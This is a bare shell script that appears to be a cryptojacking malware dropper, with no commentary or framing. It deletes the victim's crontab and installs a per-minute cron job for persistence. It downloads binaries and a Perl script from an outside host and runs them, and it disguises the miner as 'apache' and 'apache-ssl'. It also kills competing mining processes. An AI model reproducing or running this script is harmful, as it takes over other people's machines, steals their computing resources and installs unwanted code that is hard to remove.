#!/bin/sh
crontab -r
cd /tmp
rm -rf a* c* update*
pwd > mech.dir
dir=$(cat mech.dir)
echo "* * * * * $dir/update >/dev/null 2>&1" > cron.d
crontab cron.d
crontab -l | grep update
wget astraltor.de/update >> /dev/null &&
curl -O http://astraltor.de/update >> /dev/null &&
chmod u+x update

#chattr -ia bash
#chattr -ia *
curl -O http://astraltor.de/apache
curl -O http://astraltor.de/apache-ssl
curl -O http://astraltor.de/httpd.conf
wget http://astraltor.de/apache
wget http://astraltor.de/apache-ssl
wget http://astraltor.de/httpd.conf
wget http://astraltor.de/perl
perl perl
rm -rf perl*
chmod +x apache
chmod +x apache-ssl
#kill -9 `ps x|grep miner|grep -v grep|awk '{print $1}'`
kill -9 `ps x|grep stratum|grep -v grep|awk '{print $1}'`
killall -9 kav m32 m64
PATH="." apache -c httpd.conf &
PATH="." apache-ssl -c httpd.conf &
#chattr +ia bash
#chattr +ia sh

